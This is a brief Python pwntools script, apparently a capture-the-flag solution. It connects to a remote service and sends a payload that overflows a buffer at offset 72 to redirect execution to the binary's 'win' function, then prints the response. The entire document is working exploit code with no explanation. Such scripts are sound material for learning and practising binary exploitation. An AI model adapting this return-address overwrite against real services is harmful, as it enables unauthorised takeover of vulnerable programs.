from pwn import *

context.binary = elf = ELF("./main", checksec=False)
p = remote(args.HOST or "localhost", int(args.PORT or 1354))
p.sendlineafter(b"Graduation statement: ", flat({72: elf.sym.win}))
print(p.recvall().decode())
